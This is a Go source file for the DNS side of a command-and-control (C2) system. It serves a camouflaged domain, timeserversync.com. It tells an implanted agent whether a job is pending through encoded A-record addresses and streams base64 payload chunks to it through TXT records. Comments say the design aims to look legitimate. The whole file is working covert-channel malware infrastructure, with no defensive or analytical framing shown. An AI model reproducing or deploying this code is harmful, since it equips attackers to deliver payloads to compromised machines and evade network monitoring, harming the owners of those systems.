// Package dns implements the authoritative DNS server for the C2.
//
// ARCHITECTURE:
// This server responds to queries for *.timeserversync.com (or configured domain).
// It's an authoritative nameserver, meaning it's the final authority for the zone.
//
// The server maintains internal state:
//   - jobPending: whether a job is ready for the agent
//   - payloadChunks: pre-chunked payload data for TXT responses
//   - currentChunk: which chunk to send next
//
// QUERY HANDLING:
//   - A queries: Return IP from JobRange or NoJobRange based on jobPending
//   - TXT queries: Return next payload chunk (when job is active)
package dns

import (
	"fmt"
	"log"
	"os"
	"strings"
	"sync"

	"motd_joker_screenmate/internal/protocol"

	"github.com/miekg/dns"
)

// Server holds the DNS server state and configuration.
type Server struct {
	domain string
	port   int

	// State management (protected by mutex for concurrent access)
	mu            sync.RWMutex
	jobPending    bool
	payloadChunks []string // Pre-chunked base64 data
	currentChunk  int      // Index of next chunk to send
	transferDone  bool     // True after all chunks sent
}

// NewServer creates a new DNS server instance.
func NewServer(domain string, port int) *Server {
	// Ensure domain ends with a dot (DNS FQDN requirement)
	if !strings.HasSuffix(domain, ".") {
		domain = domain + "."
	}

	return &Server{
		domain: domain,
		port:   port,
	}
}

// TriggerJob loads a payload file and sets the job state to pending.
// Called by the HTTP trigger API.
func (s *Server) TriggerJob(payloadPath string) error {
	// Read the payload file
	data, err := os.ReadFile(payloadPath)
	if err != nil {
		return fmt.Errorf("failed to read payload file: %w", err)
	}

	log.Printf("[DNS] Loading payload: %s (%d bytes)", payloadPath, len(data))

	// Chunk the data for TXT records
	// Using 200 bytes per chunk (leaves room for sequence number + safety margin)
	chunks := protocol.ChunkData(data, 200)

	log.Printf("[DNS] Payload chunked into %d TXT records", len(chunks))

	// Update state atomically
	s.mu.Lock()
	s.jobPending = true
	s.payloadChunks = chunks
	s.currentChunk = 0
	s.transferDone = false
	s.mu.Unlock()

	log.Printf("[DNS] Job triggered! Next A query will return JOB IP range.")
	return nil
}

// IsJobPending returns whether a job is waiting for the agent.
func (s *Server) IsJobPending() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.jobPending
}

// Start begins listening for DNS queries.
// This function blocks, so run it in a goroutine if needed.
func (s *Server) Start() error {
	// Register handler for our domain
	// The trailing dot is important - DNS uses FQDNs
	dns.HandleFunc(s.domain, s.handleQuery)

	// Also handle subdomains (wildcard behavior)
	// miekg/dns matches the most specific pattern, so "sub.domain.com."
	// will match "domain.com." handler if no more specific one exists

	addr := fmt.Sprintf(":%d", s.port)
	log.Printf("[DNS] Starting authoritative DNS server on %s for zone %s", addr, s.domain)

	// ListenAndServe blocks until error
	// Using UDP (standard DNS) - we want to appear legitimate
	return dns.ListenAndServe(addr, "udp", nil)
}

// handleQuery processes incoming DNS queries.
// This is the core of the C2 protocol.
func (s *Server) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	// Create response message
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true // We are the authority for this zone

	// Process each question (usually just one)
	for _, q := range r.Question {
		log.Printf("[DNS] Query: %s %s from %s",
			dns.TypeToString[q.Qtype], q.Name, w.RemoteAddr())

		switch q.Qtype {
		case dns.TypeA:
			s.handleAQuery(m, q)
		case dns.TypeTXT:
			s.handleTXTQuery(m, q)
		default:
			// For other query types, return empty response
			// This is normal behavior for an authoritative server
			log.Printf("[DNS] Ignoring unsupported query type: %s", dns.TypeToString[q.Qtype])
		}
	}

	// Send response
	if err := w.WriteMsg(m); err != nil {
		log.Printf("[DNS] Failed to send response: %v", err)
	}
}

// handleAQuery responds to A record queries with job status encoded as IP.
func (s *Server) handleAQuery(m *dns.Msg, q dns.Question) {
	s.mu.RLock()
	jobPending := s.jobPending
	s.mu.RUnlock()

	var ip string
	if jobPending {
		ip = protocol.GenerateJobIP().String()
		log.Printf("[DNS] A response: %s (JOB PENDING)", ip)
	} else {
		ip = protocol.GenerateNoJobIP().String()
		log.Printf("[DNS] A response: %s (NO JOB)", ip)
	}

	// Create A record response
	rr := &dns.A{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    protocol.TTL,
		},
		A: parseIP(ip),
	}

	m.Answer = append(m.Answer, rr)
}

// handleTXTQuery responds with the next payload chunk.
// Empty response signals end of transfer.
func (s *Server) handleTXTQuery(m *dns.Msg, q dns.Question) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Check if we have chunks to send
	if !s.jobPending || s.currentChunk >= len(s.payloadChunks) {
		// No more data - send empty TXT to signal completion
		log.Printf("[DNS] TXT response: <EMPTY> (transfer complete or no job)")

		// Reset state after transfer completes
		if s.jobPending && s.currentChunk >= len(s.payloadChunks) {
			s.jobPending = false
			s.transferDone = true
			log.Printf("[DNS] Transfer complete! Returning to NO JOB state.")
		}

		// Create empty TXT record
		rr := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    protocol.TTL,
			},
			Txt: []string{""}, // Empty string signals end
		}
		m.Answer = append(m.Answer, rr)
		return
	}

	// Get next chunk
	chunk := s.payloadChunks[s.currentChunk]
	log.Printf("[DNS] TXT response: chunk %d/%d (%d bytes)",
		s.currentChunk+1, len(s.payloadChunks), len(chunk))

	// Advance to next chunk for next query
	s.currentChunk++

	// Create TXT record with chunk data
	rr := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    protocol.TTL,
		},
		Txt: []string{chunk},
	}

	m.Answer = append(m.Answer, rr)
}

// parseIP converts a string IP to net.IP.
// Helper function for creating A records.
func parseIP(s string) []byte {
	// Simple parsing - we know our IPs are valid IPv4
	var a, b, c, d byte
	fmt.Sscanf(s, "%d.%d.%d.%d", &a, &b, &c, &d)
	return []byte{a, b, c, d}
}
